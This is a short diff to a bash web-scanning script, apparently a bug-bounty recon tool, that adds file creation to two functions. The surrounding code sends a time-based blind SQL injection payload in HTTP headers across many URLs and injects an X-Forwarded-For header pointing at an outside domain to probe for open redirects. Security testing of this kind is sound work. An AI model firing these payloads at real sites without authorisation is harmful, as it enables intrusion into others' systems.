@@ -216,6 +216,7 @@ checkheadersforsqli(){
 		echo -e "\e[32mNo headers file found!\033[0m"
 		return
 	fi
+	touch $2
 	cat $1 | while read url; do
 		cat ~/tools/__diccionarios/headers.txt | while read head; do
 			response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME %{time_starttransfer}" $url)
@@ -238,6 +239,7 @@ checkheadersforredirect(){
 		echo -e "\e[32mUrls file is empty!\033[0m"
 		return
 	fi
+	touch $2
 	cat $1 | while read url; do
 		response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L $url)
 		grep -q '<!-- CHECK -->' <<< $response && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
